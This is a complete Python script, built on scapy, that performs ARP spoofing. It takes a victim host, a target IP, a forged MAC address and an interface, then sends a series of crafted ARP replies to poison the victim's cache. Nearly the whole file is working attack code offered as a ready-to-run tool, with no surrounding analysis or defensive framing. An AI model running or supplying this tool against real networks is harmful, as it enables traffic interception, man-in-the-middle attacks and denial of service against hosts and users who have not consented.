#!/usr/bin/env python3

import os, sys, time, argparse
from scapy.all import Ether, ARP, get_if_hwaddr, get_if_addr, sendp

def buildARPReply(tip, tmac, host, iface='eth0'):
    srcip = get_if_addr(iface)
    srchw = get_if_hwaddr(iface)

    ether = Ether(src=srchw, dst=host)
    arp = ARP(
        hwtype=1,
        ptype=2048,
        op=2,
        hwsrc=tmac,
        psrc=tip,
        hwdst=srchw,
        pdst=srcip,
    )
    return ether / arp 

def main():
    parser = argparse.ArgumentParser(description='ARP Spoofing')
    parser.add_argument("--target-ip", help="Target logical address in ARP reply", type=str, action='store', required=True)
    parser.add_argument("--target-mac", help="Target physical address in ARP reply", type=str, action='store', required=True)
    parser.add_argument("--host", help="Host", type=str, action='store', required=True)
    parser.add_argument("--interface", help="Network interface", type=str, action='store', required=True)
    parser.add_argument("--count", help="Packet number", type=int, action='store', default=10, required=False)
    args = parser.parse_args()

    host = args.host
    tip = args.target_ip
    tmac = args.target_mac
    cnt = args.count
    iface = args.interface 

    print("Poisoning target host %s with entry (%s => %s)..." % (host, tip, tmac))
    try:
        while True:
            if cnt == 0:
                break
            packet = buildARPReply(tip, tmac, host, iface=iface)
            sendp(packet, iface=iface)
            time.sleep(0.5)
            cnt -= 1
    except KeyboardInterrupt:
        print("-- Interrupted.")
    return 0

if __name__ == '__main__':
    sys.exit(main())
